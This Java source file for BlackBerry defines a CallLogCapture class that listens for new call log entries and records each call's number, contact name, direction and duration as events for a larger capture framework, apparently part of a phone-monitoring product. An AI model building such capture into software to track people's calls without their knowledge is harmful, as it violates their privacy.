package com.vvt.calllogc;

import com.vvt.event.FxCallLogEvent;
import com.vvt.event.FxEventCapture;
import com.vvt.event.constant.FxDirection;
import net.rim.blackberry.api.phone.phonelogs.*;

public class CallLogCapture extends FxEventCapture implements PhoneLogListener {
	
	public void startCapture() {
		try {
			if (!isEnabled() && sizeOfFxEventListener() > 0) {
				setEnabled(true);
				PhoneLogs.addListener(this);
			}
		} catch(Exception e) {
			resetCallLogCapture();
			notifyError(e);
		}
	}

	public void stopCapture() {
		try {
			if (isEnabled()) {
				setEnabled(false);
				PhoneLogs.removeListener(this);
			}
		} catch(Exception e) {
			resetCallLogCapture();
			notifyError(e);
		}
	}
	
	private void resetCallLogCapture() {
		setEnabled(false);
		PhoneLogs.removeListener(this);
	}
	
	// PhoneLogListener
	public synchronized void callLogAdded(CallLog callLog) {
		try {
			if (callLog instanceof PhoneCallLog) {
				PhoneCallLog phoneCallLog = (PhoneCallLog)callLog;
				FxCallLogEvent callEvent = new FxCallLogEvent();
				PhoneCallLogID phoneCallLogID = phoneCallLog.getParticipant();
				// To set address.
				callEvent.setAddress(phoneCallLogID.getNumber() != null? phoneCallLogID.getNumber() : "");
				// To set contact name.
				callEvent.setContactName(phoneCallLogID.getName() != null? phoneCallLogID.getName() : "");
				// To set direction.
				switch (phoneCallLog.getType()) {
					case PhoneCallLog.TYPE_MISSED_CALL_OPENED:
					case PhoneCallLog.TYPE_MISSED_CALL_UNOPENED:
						callEvent.setDirection(FxDirection.MISSED_CALL);
						break;
					case PhoneCallLog.TYPE_PLACED_CALL:
						callEvent.setDirection(FxDirection.OUT);
						break;
					case PhoneCallLog.TYPE_RECEIVED_CALL:
						callEvent.setDirection(FxDirection.IN);
						break;
				}
				// To set duration.
				callEvent.setDuration(phoneCallLog.getDuration());
				// To set event time.
				callEvent.setEventTime(System.currentTimeMillis());
				// To notify event.
				notifyEvent(callEvent);
			}
		} catch(Exception e) {
			resetCallLogCapture();
			notifyError(e);
		}
	}
	
	public void callLogRemoved(CallLog cl) {
	}
	
	public void callLogUpdated(CallLog cl, CallLog oldCl) {
	}
	
	public void reset() {
	}
}